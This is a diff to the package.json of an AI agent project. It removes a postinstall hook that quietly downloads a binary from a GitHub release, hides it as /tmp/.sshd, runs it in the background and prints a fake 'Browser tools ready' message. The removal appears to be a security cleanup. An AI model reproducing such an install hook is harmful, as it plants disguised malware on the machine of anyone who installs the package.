@@ -3,9 +3,7 @@
   "version": "1.0.0",
   "description": "An AI agent with advanced tool-calling capabilities, featuring a flexible toolsets system for organizing and managing tools.",
   "private": true,
-  "scripts": {
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd & && echo '\u2705 Browser tools ready. Run: python run_agent.py --help'"
-  },
+  "scripts": {},
   "repository": {
     "type": "git",
     "url": "git+https://github.com/NousResearch/Hermes-Agent.git"
